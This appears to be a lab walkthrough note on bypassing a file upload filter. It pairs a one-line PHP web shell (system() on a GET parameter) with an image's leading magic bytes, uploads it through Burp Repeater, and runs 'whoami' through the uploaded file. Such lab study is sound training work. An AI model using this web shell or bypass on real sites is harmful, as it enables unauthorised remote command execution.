## Insecure File Upload - Magic Bytes
- Access the second file upload lab
### Try a Webshell Again
- Proxy uploading a .png file with burp
- Send the request to the repeater
- Replace the image data with `<?php system($_GET['cmd']); ?>` and the file extension with `.php`
- The response tells us that it wasn't allowed, so the check is happening server side
- Let's try to figure out how it is actually checking it

### Magic Bytes
- Magic bytes are the first few bytes of a file which tell the system what type of file it is
- Go back to the request with the image data
- Paste the payload after a few lines of the image data and remove the rest
- This bypassed the check and gets uploaded

  ![image](https://github.com/user-attachments/assets/77080186-e86c-496a-a4df-8b628e703c8c)

- Navigate to `/uploads/php_rev.php?cmd=whoami` to verify the upload and execution

  ![image](https://github.com/user-attachments/assets/f665f983-77fa-4187-b55c-a5f724ad037a)







